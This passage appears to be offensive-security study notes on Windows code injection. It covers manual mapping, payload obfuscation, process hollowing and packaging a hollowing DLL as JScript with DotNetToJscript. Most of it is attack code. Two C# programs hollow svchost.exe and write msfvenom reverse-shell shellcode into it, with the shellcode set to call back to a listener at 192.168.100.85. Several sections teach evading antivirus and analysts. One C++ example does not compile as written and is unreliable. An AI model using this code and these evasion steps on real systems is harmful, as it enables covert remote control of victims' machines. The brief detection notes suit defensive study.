    // Allocate memory in the target process for the entire image
    LPVOID pTargetBase = VirtualAllocEx(hProcess, (LPVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pTargetBase)
        return false;

    // Write the headers to the allocated memory
    WriteProcessMemory(hProcess, pTargetBase, pSrcData, pNtHeaders->OptionalHeader.SizeOfHeaders, nullptr);

    // Write each section to the allocated memory
    IMAGE_SECTION_HEADER* pSectionHeader = (IMAGE_SECTION_HEADER*)(pNtHeaders + 1);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(hProcess, (LPVOID)((BYTE*)pTargetBase + pSectionHeader[i].VirtualAddress),
            pSrcData + pSectionHeader[i].PointerToRawData, pSectionHeader[i].SizeOfRawData, nullptr);
    }

    // Resolve imports and fix relocations here (omitted for brevity)

    // Call the entry point (DllMain)
    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0,
        (LPTHREAD_START_ROUTINE)((BYTE*)pTargetBase + pNtHeaders->OptionalHeader.AddressOfEntryPoint), nullptr, 0, nullptr);

    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
        return true;
    }

    return false;
}
```

#### **Key Points to Remember:**
- **PE Parsing**: You need to correctly parse the PE headers to locate sections and imports.
- **Relocation**: If the preferred base address isn’t available, relocate the addresses accordingly.
- **Import Resolution**: Manually resolve imports using `GetProcAddress` to find the addresses of functions in loaded modules.

### **2. Obfuscation Techniques**

Obfuscation is the practice of hiding the true intent or content of code, making it more difficult to analyze, reverse-engineer, or detect by security tools. Common obfuscation techniques include:

- **String Obfuscation**: Encrypting or encoding strings used in the payload, such as API names, file paths, or command-line arguments.
  
- **Control Flow Obfuscation**: Altering the logical flow of the code to make it harder to follow. This can involve adding junk code, dead code, or confusing control structures.

- **Packing**: Compressing or encrypting the entire binary and unpacking it at runtime. This is commonly done using tools like UPX or custom packers.

- **Function Inlining and Splitting**: Breaking functions into smaller parts or inlining small functions to make the code less recognizable.

#### **Example of String Obfuscation in PowerShell**

Here’s a PowerShell example of how to obfuscate a string used in a script:

```powershell
# Original string
$command = "Get-Process explorer"

# Base64 encode the string
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($command))

# Decode and execute at runtime
$decodedCommand = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
```

In this example, the command string is encoded in Base64 and then decoded at runtime, making it harder to detect by simple static analysis.

#### **Example of Control Flow Obfuscation**

```powershell
# Simple command
$cmd = "Get-Process"

# Obfuscated version with control flow alteration
$cmdArray = @('G', 'e', 't', '-', 'P', 'r', 'o', 'c', 'e', 's', 's')
$cmdObfuscated = $cmdArray -join ''
if ($true) {
    Invoke-Expression $cmdObfuscated
} else {
    Write-Output "This will never run"
}
```

Here, the string is built dynamically from an array, and the control flow includes a redundant conditional that makes the script more difficult to analyze.

### **3. Combining Manual Mapping and Obfuscation**

By combining manual mapping and obfuscation, you can create a stealthy payload that is both difficult to detect by traditional security tools and challenging for analysts to reverse-engineer.

- **Manual Mapping**: Bypasses common detection techniques that rely on monitoring Windows API calls like `LoadLibrary`.
- **Obfuscation**: Hides the intent of the code, making it harder for security tools to flag it as malicious.

### **Detection and Defense**

Security teams should be aware of these techniques and implement advanced monitoring and detection mechanisms, such as:

- **Behavioral Analysis**: Monitoring for unusual memory allocation and thread creation patterns.
- **Code Integrity Checks**: Using tools that can detect non-standard methods of code injection.
- **Memory Scanning**: Regularly scanning process memory for anomalies, including suspicious sections or encoded strings.

### **Conclusion**

Manual mapping and obfuscation are powerful techniques used by attackers to evade detection and carry out code injection. Implementing these techniques requires a deep understanding of the Windows operating system and the PE file format, along with creative methods for obfuscating the intent and content of the payload.

## Process Hollowing

MITRE Attack Technique: https://attack.mitre.org/techniques/T1055/012/
"Process hollowing is commonly performed by creating a process in a suspended state then unmapping/hollowing its memory, which can then be replaced with malicious code."


There are a few steps we must perform and components to consider, but the most important is the use of the _CREATE_SUSPENDED flag during process creation. This flag allows us to create a new suspended (or halted) process.

When a process is created through the _CreateProcess API, the operating system does three things:

1. Creates the virtual memory space for the new process.
2. Allocates the stack along with the _Thread Environment Block_ (TEB)and the _Process Environment Block_ (PEB).
3. Loads the required DLLs and the EXE into memory.

Once all of these tasks have been completed, the operating system will create a thread to execute the code, which will start at the _EntryPoint_ of the executable. If we supply the _CREATE_SUSPENDED_ flag when calling _CreateProcess_, the execution of the thread is halted just before it runs the EXE's first instruction.

#### Steps
1. Call CreateProcess API
	1. Creates virtual memory space for the new process
	2. Allocates the stack with the TEB and PEB
	3. Loads required dlls and exe into memory
2. Supply CREATE_SUSPENDED flag to the CreateProcess API
3. Need to locate the EntryPoint of the exe and overwrite it's in-memory content with staged shellcode
	1. ZwQueryInformationProcess API called to get PEP address

	```c++
			NTSTATUS WINAPI ZwQueryInformationProcess(
			  _In_      HANDLE           ProcessHandle,
			  _In_      PROCESSINFOCLASS ProcessInformationClass,
			  _Out_     PVOID            ProcessInformation,
			  _In_      ULONG            ProcessInformationLength,
			  _Out_opt_ PULONG           ReturnLength
			);
	```
	2. Supply enum from ProcessInformationClass to ZwQueryInformationProcess
	3. Supply 0 for ProcessBasicInformation in ProcessInformationClass to obtain the PEB in the suspended process
	4. Base address of the exe will be at offset 0x10 bytes into the PEB
4. Read the EXE base address
	1. use ReadProcessMemory API


It is worth noting that a memory address takes up eight bytes in a 64-bit process, while it only uses four bytes in a 32-bit process, so the use of variable types, offsets, and amount of data read must be adapted.

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollow
{
    class Program
    {
        // http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        // http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        // http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        // http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniquePID;
            public IntPtr InheritedFromUniqueProcessId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen
        );

        // http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead
        );

        // http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            Int32 nSize,
            out IntPtr lpNumberOfBytesWritten
        );

        // https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
        static uint CREATE_SUSPENDED = 0x00000004;

        // https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
        static int ProcessBasicInformation = 0x00000000;

        static void Main(string[] args)
        {

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ref sa, ref sa, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            IntPtr entryPoint = IntPtr.Zero;
            // msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.100.85 -f csharp -v shellcode (ENCODED)
            byte[] buf = new byte[734] {0xfc,0x48,0x83,0xe4,0xf0,
 ...                                     0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```


### **Process Hollowing: An In-Depth Analysis**

**Process hollowing** is a sophisticated code injection technique where an attacker spawns a legitimate process in a suspended state, replaces its code with malicious code, and then resumes the process, making it appear as if the legitimate process is running while it is executing the injected malicious code. This method is often used to evade detection by security mechanisms because the malicious code runs under the guise of a trusted process.

### **Steps Involved in Process Hollowing**

1. **Create a Suspended Process**: The attacker first creates a new process in a suspended state using functions like `CreateProcess` with the `CREATE_SUSPENDED` flag. This allows the process to be created without starting execution immediately.

2. **Unmap the Legitimate Process Memory**: The memory where the legitimate process's code resides is unmapped using `ZwUnmapViewOfSection`. This removes the original executable code, leaving an empty address space.

3. **Map the Malicious Code into the Process**: The attacker allocates memory in the process's address space and writes the malicious code into it. The malicious code could be a DLL or shellcode.

4. **Adjust the Entry Point**: The entry point of the process is adjusted to point to the start of the malicious code. This ensures that when the process is resumed, the malicious code will execute.

5. **Resume the Process**: Finally, the attacker resumes the process using `ResumeThread`. The process now starts executing the malicious code instead of the original legitimate code.

### **Example Code for Process Hollowing (C/C++)**

```cpp
#include <windows.h>
#include <winternl.h>

bool HollowProcess(const char* pwszTargetPath, const char* pwszMaliciousPath) {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Step 1: Create the process in a suspended state
    if (!CreateProcessA(pwszTargetPath, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        return false;
    }

    // Step 2: Get the base address of the image in the process
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Get the base address from the PEB (Process Environment Block)
    PVOID pImageBase;
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pImageBase, sizeof(PVOID), nullptr);

    // Step 3: Unmap the original executable from the process's memory
    ZwUnmapViewOfSection(pi.hProcess, pImageBase);

    // Step 4: Allocate memory for the malicious code
    PVOID pMaliciousBase = VirtualAllocEx(pi.hProcess, pImageBase, pwszMaliciousPath->SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pMaliciousBase) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Step 5: Write the malicious code into the process
    WriteProcessMemory(pi.hProcess, pMaliciousBase, pwszMaliciousPath, pwszMaliciousPath->SizeOfImage, nullptr);

    // Step 6: Set the entry point to the malicious code
    ctx.Rcx = (DWORD64)pMaliciousBase + pwszMaliciousPath->AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    // Step 7: Resume the process
    ResumeThread(pi.hThread);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    return true;
}
```

### **Key Points to Remember:**

- **ZwUnmapViewOfSection**: This function is critical for removing the original process image from memory, allowing the attacker to replace it with the malicious code.
  
- **PEB (Process Environment Block)**: Understanding the PEB structure is essential as it contains critical information, including the base address of the process image.

- **Process Environment**: The attacker must ensure that the process environment, such as the PEB and TEB (Thread Environment Block), is properly set up for the malicious code to execute correctly.

### **Obfuscation Techniques with Process Hollowing**

Process hollowing can be combined with various obfuscation techniques to make detection even harder:

1. **Dynamic API Resolution**: Instead of statically linking to APIs like `CreateProcess`, dynamically resolve these APIs at runtime using `GetProcAddress`.

2. **Control Flow Obfuscation**: Alter the control flow in the hollowing code to include dead code, loops, or conditional branches that serve no purpose but make the code harder to analyze.

3. **String Encryption**: Encrypt strings, such as the path to the malicious code or API names, and decrypt them only when needed.

4. **Anti-Debugging Techniques**: Incorporate checks to detect if the process is being debugged and alter the behavior accordingly.

### **Detection and Defense**

Security teams need to implement robust detection mechanisms to identify and mitigate process hollowing attempts:

1. **Behavioral Analysis**: Monitor for unusual process creation patterns, especially those involving suspended processes that have their memory modified before being resumed.

2. **Memory Scanning**: Scan the memory of running processes for inconsistencies between the loaded image and the on-disk executable, which may indicate that a process has been hollowed.

3. **API Monitoring**: Keep an eye on calls to `ZwUnmapViewOfSection`, `VirtualAllocEx`, and `WriteProcessMemory`, as these are commonly used in process hollowing.

4. **Event Logging**: Enable detailed logging of process creation events and any modifications to process memory, and correlate these with other suspicious activities.

### **Conclusion**

Process hollowing is a powerful technique for stealthily executing malicious code within a legitimate process, thereby evading detection. By combining process hollowing with obfuscation and anti-analysis techniques, attackers can create highly evasive malware. To defend against such techniques, security teams must implement multi-layered detection strategies that focus on both behavior and memory integrity.

### DotNetToJscript

```csharp

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

[ComVisible(true)]
public class ProcessHollowClass
{

    // http://www.pinvoke.net/default.aspx/Structures/SECURITY_ATTRIBUTES.html
    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }

    // http://www.pinvoke.net/default.aspx/Structures/STARTUPINFO.html
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    // http://www.pinvoke.net/default.aspx/Structures/PROCESS_INFORMATION.html
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }

    // http://www.pinvoke.net/default.aspx/kernel32/CreateProcess.html
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        ref SECURITY_ATTRIBUTES lpProcessAttributes,
        ref SECURITY_ATTRIBUTES lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        [In] ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation
    );

    // http://www.pinvoke.net/default.aspx/kernel32/ResumeThread.html
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint ResumeThread(IntPtr hThread);

    // http://www.pinvoke.net/default.aspx/Structures/PROCESS_BASIC_INFORMATION.html
    [StructLayout(LayoutKind.Sequential)]
    internal struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniquePID;
        public IntPtr InheritedFromUniqueProcessId;
    }

    [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
    static extern int ZwQueryInformationProcess(
        IntPtr hProcess,
        int procInformationClass,
        ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen,
        ref uint retlen
    );

    // http://www.pinvoke.net/default.aspx/kernel32/ReadProcessMemory.html
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        [Out] byte[] lpBuffer,
        int dwSize,
        out IntPtr lpNumberOfBytesRead
    );

    // http://www.pinvoke.net/default.aspx/kernel32/WriteProcessMemory.html
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        Int32 nSize,
        out IntPtr lpNumberOfBytesWritten
    );

    // https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags
    static uint CREATE_SUSPENDED = 0x00000004;

    // https://learn.microsoft.com/en-us/windows/win32/procthread/zwqueryinformationprocess
    static int ProcessBasicInformation = 0x00000000;
    public ProcessHollowClass()
    {

        // 1 -- Create the target process in a suspended state

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi;
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();

        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", ref sa, ref sa, false, 0x4, IntPtr.Zero, null, ref si, out pi);


            // 2 -- Get the address of the Process Environment Block

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size* 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);



            // 3 -- Extract the Image Base Address from the PEB

        byte[] addrBuf = new byte[IntPtr.Size];
        IntPtr nRead = IntPtr.Zero;
        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));


            // 4 -- Read the PE structure to find the EntryPoint address

        byte[] data = new byte[0x200];
        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
        uint opthdr = e_lfanew_offset + 0x28;
        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

        IntPtr entryPoint = IntPtr.Zero;


            // 5 -- Write shellcode at EntryPoint

            // msfvenom -p windows/x64/shell_reverse_tcp LPORT=4444 LHOST=192.168.100.85 -f csharp -v shellcode (ENCODED)
            byte[] buf = new byte[734] {0xfc,0x48,0x83,0xe4,0xf0,
...                                    0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5};

        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);
        ResumeThread(pi.hThread);

    }

    public void RunProcess(string path)
    {
        Process.Start(path);
    }
}

```

- convert dll to jscript using DotNetToJscript.exe
```cmd
DotNetToJScript.exe .\source\repos\ProcessHollowClass\ProcessHollowClass\bin\x64\Release\ProcessHollowClass.dll --lang=Jscript --ver=v4 -o demo.js -c ProcessHollowClass
```